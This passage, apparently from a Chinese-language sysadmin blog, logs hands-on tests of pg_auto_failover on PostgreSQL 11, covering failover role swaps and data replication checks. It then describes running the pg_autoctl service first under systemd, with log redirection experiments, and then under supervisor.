delta is 0. 03:12:50 INFO Calling node_active for node default/4/0 with current state: wait_primary, PostgreSQL is running, sync_state is \u0026#34;async\u0026#34;, WAL delta is 0. 03:12:50 INFO FSM transition from \u0026#34;wait_primary\u0026#34; to \u0026#34;primary\u0026#34;: A healthy secondary appeared 03:12:50 INFO Enabling synchronous replication 03:12:50 INFO Transition complete: current state is now \u0026#34;primary\u0026#34; 03:12:50 INFO Calling node_active for node default/4/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. 03:12:55 INFO Calling node_active for node default/4/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. pg-slave 的狀態從原本的secondary 變成了 primary\n來檢查看看\n2019-09-20 03:19:04 [administrator@pg-slave ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl show state\u0026#34; Name | Port | Group | Node | Current State | Assigned State -----------+--------+-------+-------+-------------------+------------------ pg-primary | 5432 | 0 | 1 | secondary | secondary pg-slave | 5432 | 0 | 4 | primary | primary 2019-09-20 03:19:07 [administrator@pg-slave ~]$ 跟上面第一次執行的結果不同了，兩台角色互換了，這也是預期中的結果\n那在pg-master 離線期間的異動資料呢？在 pg-master上查得到嗎？\n先透過 URI存取DB 檢查看看\n2019-09-20 11:12:16 [administrator@pg-primary ~]$ sudo runuser -l postgres -c \u0026#34;psql postgres://pg-slave:5432,pg-primary:5432/postgres?target_session_attrs=read-write\u0026#34; psql (11.5 (Ubuntu 11.5-1.pgdg18.04+1)) Type \u0026#34;help\u0026#34; for help. postgres=# \\l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -------------+----------+-----------+---------+-------+----------------------- nexus | postgres | SQL_ASCII | C | C | postgres | postgres | SQL_ASCII | C | C | template0 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres testdb_1058 | postgres | SQL_ASCII | C | C | testdb_1108 | postgres | SQL_ASCII | C | C | (6 rows) postgres=# select * from testtbl_1108; serial -------- 999 888 77 66 55 (5 rows) postgres=# GOOD！看來資料也同步過來了\n再來看看單機的狀態\n2019-09-20 11:22:07 [administrator@pg-primary ~]$ sudo runuser -l postgres -c \u0026#34;psql\u0026#34; psql (11.5 (Ubuntu 11.5-1.pgdg18.04+1)) Type \u0026#34;help\u0026#34; for help. postgres=# \\l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -------------+----------+-----------+---------+-------+----------------------- nexus | postgres | SQL_ASCII | C | C | postgres | postgres | SQL_ASCII | C | C | template0 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres testdb_1058 | postgres | SQL_ASCII | C | C | testdb_1108 | postgres | SQL_ASCII | C | C | (6 rows) postgres=# select * from testtbl_1108; serial -------- 999 888 77 66 55 (5 rows) postgres=# 很好，確認資料有正確的抄寫過來！\n以上測試可以發現 pg_auto_failover 這個postgresql的extension 還真的很好用！\n設定簡單、快速、方便，設定完成後也不用傷腦筋，反正有異常，會自動幫你搞定master-slave之間的主從關係\n資料也都會自動同步好，真的是非常推薦啊！\nUPDATE\n將 pg_auto_failover 用 systemd 管理 每次都要手動執行 pg_autoctl run 太麻煩了，應該用systemd 或者是 supervisor 來管理\n而pg_auto_failover 有指令可以做成 systemd 的service 檔案\n既然人家都做好了，當然就直接用 systemd 來做\n執行以下指令，產生 systemd configuration\nsudo runuser -l postgres -c \u0026#34;pg_autoctl -q show systemd\u0026#34; | sudo tee /etc/systemd/system/pgautofailover.service 在/etc/systemd/system底下會多出一個 pgautofailover.service檔案\n內容就是 pg_auto_failover 所提供的 systemd config\n接下來就可以直接用 sudo service pgautofailover start 來啟動\n沒有什麼問題，不過呢，這樣的作法，會在 /var/log/syslog 塞滿了 pg_auto_failover 的紀錄\nSep 20 14:59:34 pg-primary systemd[1]: Started pg_auto_failover. Sep 20 14:59:34 pg-primary pg_autoctl[7817]: 14:59:34 INFO Managing PostgreSQL installation at \u0026#34;/var/lib/postgresql/11/main\u0026#34; Sep 20 14:59:34 pg-primary pg_autoctl[7817]: 14:59:34 INFO Found a stale pidfile at \u0026#34;/tmp/pg_autoctl/var/lib/postgresql/11/main/pg_autoctl.pid\u0026#34; Sep 20 14:59:34 pg-primary pg_autoctl[7817]: 14:59:34 WARN Removing the stale pid file \u0026#34;/tmp/pg_autoctl/var/lib/postgresql/11/main/pg_autoctl.pid\u0026#34; Sep 20 14:59:34 pg-primary pg_autoctl[7817]: 14:59:34 INFO The version of extenstion \u0026#34;pgautofailover\u0026#34; is \u0026#34;1.0\u0026#34; on the monitor Sep 20 14:59:34 pg-primary pg_autoctl[7817]: 14:59:34 INFO pg_autoctl service is starting Sep 20 14:59:34 pg-primary pg_autoctl[7817]: 14:59:34 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 14:59:39 pg-primary pg_autoctl[7817]: 14:59:39 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 14:59:44 pg-primary pg_autoctl[7817]: 14:59:44 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 14:59:49 pg-primary pg_autoctl[7817]: 14:59:49 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 14:59:54 pg-primary pg_autoctl[7817]: 14:59:54 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 14:59:59 pg-primary pg_autoctl[7817]: 14:59:59 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:04 pg-primary pg_autoctl[7817]: 15:00:04 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:09 pg-primary pg_autoctl[7817]: 15:00:09 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:15 pg-primary pg_autoctl[7817]: 15:00:14 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:20 pg-primary pg_autoctl[7817]: 15:00:20 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:25 pg-primary pg_autoctl[7817]: 15:00:25 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:30 pg-primary pg_autoctl[7817]: 15:00:30 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:35 pg-primary pg_autoctl[7817]: 15:00:35 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:40 pg-primary pg_autoctl[7817]: 15:00:40 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:45 pg-primary pg_autoctl[7817]: 15:00:45 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:50 pg-primary pg_autoctl[7817]: 15:00:50 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:00:55 pg-primary pg_autoctl[7817]: 15:00:55 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:00 pg-primary pg_autoctl[7817]: 15:01:00 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:05 pg-primary pg_autoctl[7817]: 15:01:05 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:10 pg-primary pg_autoctl[7817]: 15:01:10 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:15 pg-primary pg_autoctl[7817]: 15:01:15 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:20 pg-primary pg_autoctl[7817]: 15:01:20 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:25 pg-primary pg_autoctl[7817]: 15:01:25 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:30 pg-primary pg_autoctl[7817]: 15:01:30 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:35 pg-primary pg_autoctl[7817]: 15:01:35 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:40 pg-primary pg_autoctl[7817]: 15:01:40 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:45 pg-primary pg_autoctl[7817]: 15:01:45 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:50 pg-primary pg_autoctl[7817]: 15:01:50 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:01:55 pg-primary pg_autoctl[7817]: 15:01:55 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:00 pg-primary pg_autoctl[7817]: 15:02:00 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:05 pg-primary pg_autoctl[7817]: 15:02:05 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:10 pg-primary pg_autoctl[7817]: 15:02:10 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:15 pg-primary pg_autoctl[7817]: 15:02:15 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:20 pg-primary pg_autoctl[7817]: 15:02:20 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:25 pg-primary pg_autoctl[7817]: 15:02:25 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:30 pg-primary pg_autoctl[7817]: 15:02:30 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:35 pg-primary pg_autoctl[7817]: 15:02:35 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:40 pg-primary pg_autoctl[7817]: 15:02:40 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:46 pg-primary pg_autoctl[7817]: 15:02:46 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:51 pg-primary pg_autoctl[7817]: 15:02:51 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:02:56 pg-primary pg_autoctl[7817]: 15:02:56 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:01 pg-primary pg_autoctl[7817]: 15:03:01 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:06 pg-primary pg_autoctl[7817]: 15:03:06 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:11 pg-primary pg_autoctl[7817]: 15:03:11 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:16 pg-primary pg_autoctl[7817]: 15:03:16 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:21 pg-primary pg_autoctl[7817]: 15:03:21 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:26 pg-primary pg_autoctl[7817]: 15:03:26 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:31 pg-primary pg_autoctl[7817]: 15:03:31 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:36 pg-primary pg_autoctl[7817]: 15:03:36 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:41 pg-primary pg_autoctl[7817]: 15:03:41 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:46 pg-primary pg_autoctl[7817]: 15:03:46 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:51 pg-primary pg_autoctl[7817]: 15:03:51 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:03:57 pg-primary pg_autoctl[7817]: 15:03:57 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:02 pg-primary pg_autoctl[7817]: 15:04:02 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:07 pg-primary pg_autoctl[7817]: 15:04:07 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:12 pg-primary pg_autoctl[7817]: 15:04:12 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:17 pg-primary pg_autoctl[7817]: 15:04:17 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:22 pg-primary pg_autoctl[7817]: 15:04:22 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:27 pg-primary pg_autoctl[7817]: 15:04:27 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:32 pg-primary pg_autoctl[7817]: 15:04:32 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:37 pg-primary pg_autoctl[7817]: 15:04:37 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:42 pg-primary pg_autoctl[7817]: 15:04:42 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:47 pg-primary pg_autoctl[7817]: 15:04:47 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. Sep 20 15:04:52 pg-primary pg_autoctl[7817]: 15:04:52 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 這樣下去不用多久，syslog 一定爆，而且嚴重干擾到其他的系統訊息\n所以要修改一下 config ，把log 寫到另外的檔案去\n在/etc/systemd/system/pgautofailover.service 加入底下兩行\nStandardOutput=file:/var/log/pgautofailover.log StandardError=file:/var/log/pgautofailover-error.log 然後 sudo systemctl daemon-reload 接著重起 sudo service pgautofailover restart\n就會把訊息都寫到 /var/log/pgautofailover.log , /var/log/pgautofailover-error.log\n再用 logrotate 來管理就可以了\n這個動作需要在三台node都執行\n不過我在想應該是可以不要產生那麼多log ，只要紀錄 critical 就好了？來試試看加入 LogLevelMax=3 的效果\n在 /etc/systemd/system/pgautofailover.service 檔案中的service 區段 加入\nLogLevelMax=3 loglevel 的等級定義看這邊\nhttps://www.ctrl.blog/entry/systemd-log-levels.html\nemergency (0) alert (1) critical (2) error (3) warning (4) notice (5) info (6) debug (7) 完成後，一樣執行\nsudo systemctl daemon-reload sudo service pgautofailover restart 看一下檔案內容，怎麼就沒有訊息了！\n2019-09-20 15:23:15 [administrator@pg-primary ~]$ sudo tail -30 /var/log/pgautofailover.log 15:14:22 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:14:27 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:14:32 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:14:37 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:14:42 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:14:47 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:14:52 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:14:57 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:02 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:07 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:12 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:17 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:22 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:27 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:32 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:37 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:42 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:47 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:52 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:15:58 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:16:03 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:16:08 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:16:13 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:16:18 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:16:23 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:16:28 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:16:34 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:16:39 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 15:16:39 WARN Smart shutdown: received signal Terminated 15:16:39 INFO pg_autoctl service stopping 2019-09-20 15:23:29 [administrator@pg-primary ~]$ 可是我的服務活著啊！\n2019-09-20 15:23:29 [administrator@pg-primary ~]$ sudo service pgautofailover status ● pgautofailover.service - pg_auto_failover Loaded: loaded (/etc/systemd/system/pgautofailover.service; disabled; vendor preset: enabled) Active: active (running) since Fri 2019-09-20 15:16:39 CST; 7min ago Main PID: 8611 (pg_autoctl) Tasks: 1 (limit: 2321) CGroup: /system.slice/pgautofailover.service └─8611 /usr/bin/pg_autoctl run Sep 20 15:16:39 pg-primary systemd[1]: Started pg_auto_failover. 2019-09-20 15:23:56 [administrator@pg-primary ~]$ 拿另一台來做實驗，先不要加入 loglevelmax=3 ，看看log到底長怎樣！\n2019-09-20 07:25:34 [administrator@pg-slave ~]$ sudo service pgautofailover stop 2019-09-20 07:25:58 [administrator@pg-slave ~]$ sudo tail -10 /var/log/syslog Sep 20 07:25:32 pg-slave pg_autoctl[5840]: 07:25:32 INFO Calling node_active for node default/4/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. Sep 20 07:25:37 pg-slave pg_autoctl[5840]: 07:25:37 INFO Calling node_active for node default/4/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. Sep 20 07:25:42 pg-slave pg_autoctl[5840]: 07:25:42 INFO Calling node_active for node default/4/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. Sep 20 07:25:47 pg-slave pg_autoctl[5840]: 07:25:47 INFO Calling node_active for node default/4/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. Sep 20 07:25:52 pg-slave pg_autoctl[5840]: 07:25:52 INFO Calling node_active for node default/4/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. Sep 20 07:25:57 pg-slave pg_autoctl[5840]: 07:25:57 INFO Calling node_active for node default/4/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. Sep 20 07:25:58 pg-slave systemd[1]: Stopping pg_auto_failover... Sep 20 07:25:58 pg-slave pg_autoctl[5840]: 07:25:58 WARN Smart shutdown: received signal Terminated Sep 20 07:25:58 pg-slave pg_autoctl[5840]: 07:25:58 INFO pg_autoctl service stopping Sep 20 07:25:58 pg-slave systemd[1]: Stopped pg_auto_failover. 好吧，看不出有什麼差別！ 直接把primary 關機測試！ 結果還是看不出來 0rz\n放棄加入loglevel 的想法，就用logrotate 來管理吧！\nUPDATE\n用systemd 來管理的作法失敗了，重起之後， pgautofailover 不會自動啟動\u0026hellip;\n找了很久找不出原因，改用 supervisor來做好了\n設定 supervisor 安裝supervisor\nsudo apt install supervisor sudo vim /etc/supervisor/conf.d/pgautofailover.conf 加入以下內容 [program:pgautofailover] command = pg_autoctl run user = postgres autostart=true autorestart=true redirect_stderr = true environment=PGDATA=/var/lib/postgresql/11/main,HOME=/var/lib/postgresql 重新啟動 supervisor \u0026amp; 檢查狀態\n2019-09-20 17:26:22 [administrator@pg-primary postgresql]$ sudo service supervisor restart 2019-09-20 17:26:57 [administrator@pg-primary postgresql]$ sudo supervisorctl status pgautofailover RUNNING pid 14554, uptime 0:00:05 2019-09-20 17:27:03 [administrator@pg-primary postgresql]$ 檢查 supervisor log\n2019-09-20 17:27:03 [administrator@pg-primary postgresql]$ sudo tail -30 /var/log/supervisor/pgautofailover-stdout---supervisor-5V8qET.log 17:26:58 INFO Managing PostgreSQL installation at \u0026#34;/var/lib/postgresql/11/main\u0026#34; 17:26:58 INFO Found a stale pidfile at \u0026#34;/tmp/pg_autoctl/var/lib/postgresql/11/main/pg_autoctl.pid\u0026#34; 17:26:58 WARN Removing the stale pid file \u0026#34;/tmp/pg_autoctl/var/lib/postgresql/11/main/pg_autoctl.pid\u0026#34; 17:26:58 INFO The version of extenstion \u0026#34;pgautofailover\u0026#34; is \u0026#34;1.0\u0026#34; on the monitor 17:26:58 INFO pg_autoctl service is starting 17:26:58 INFO Calling node_active for node default/1/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. 17:27:03 INFO Calling node_active for node default/1/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. 17:27:08 INFO Calling node_active for node default/1/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. 17:27:13 INFO Calling node_active for node default/1/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. 17:27:18 INFO Calling node_active for node default/1/0 with current state: primary, PostgreSQL is running, sync_state is \u0026#34;sync\u0026#34;, WAL delta is 0. 2019-09-20 17:27:21 [administrator@pg-primary postgresql]$ 簡單多了 \u0026hellip; 在剩下的monitor/slave 也一樣操作安裝、設定supervisor 就可以了\n喔，順便把剛剛新增的 systemd config 給砍了..\n不過不砍也沒差，反正開機也不會自己啟動 = =+\n2019-09-20 17:24:17 [administrator@pg-slave ~]$ sudo rm -rf /etc/systemd/system/pgautofailover.service #安裝supervisor 2019-09-20 17:23:08 [administrator@pg-slave ~]$ sudo apt install supervisor Reading package lists... Done Building dependency tree Reading state information... Done The following additional packages will be installed: python-meld3 python-pkg-resources Suggested packages: python-setuptools supervisor-doc The following NEW packages will be installed: python-meld3 python-pkg-resources supervisor 0 upgraded, 3 newly installed, 0 to remove and 167 not upgraded. Need to get 415 kB of archives. After this operation, 2,138 kB of additional disk space will be used. Do you want to continue? [Y/n] y Get:1 http://archive.ubuntu.com/ubuntu bionic/main amd64 python-pkg-resources all 39.0.1-2 [128 kB] Get:2 http://archive.ubuntu.com/ubuntu bionic/universe amd64 python-meld3 all 1.0.2-2 [30.9 kB] Get:3 http://archive.ubuntu.com/ubuntu bionic/universe amd64 supervisor all 3.3.1-1.1 [256 kB] Fetched 415 kB in 0s (6,752 kB/s) Selecting previously unselected package python-pkg-resources. (Reading database ... 103586 files and directories currently installed.) Preparing to unpack .../python-pkg-resources_39.0.1-2_all.deb ... Unpacking python-pkg-resources (39.0.1-2) ... Selecting previously unselected package python-meld3. Preparing to unpack .../python-meld3_1.0.2-2_all.deb ... Unpacking python-meld3 (1.0.2-2) ... Selecting previously unselected package supervisor. Preparing to unpack .../supervisor_3.3.1-1.1_all.deb ... Unpacking supervisor (3.3.1-1.1) ... Processing triggers for ureadahead (0.100.0-20) ... Setting up python-meld3 (1.0.2-2) ... Setting up python-pkg-resources (39.0.1-2) ... Setting up supervisor (3.3.1-1.1) ... Created symlink /etc/systemd/system/multi-user.target.wants/supervisor.service → /lib/systemd/system/supervisor.service. Processing triggers for systemd (237-3ubuntu10.29) ... Processing triggers for man-db (2.8.3-2) ... Processing triggers for ureadahead (0.100.0-20) ... 2019-09-20 17:23:37 [administrator@pg-slave ~]$ sudo vim /etc/supervisor/conf.d/pgautofailover.conf #貼上上面的 conf 內容 2019-09-20 17:30:12 [administrator@pg-slave ~]$ sudo service supervisor restart 2019-09-20 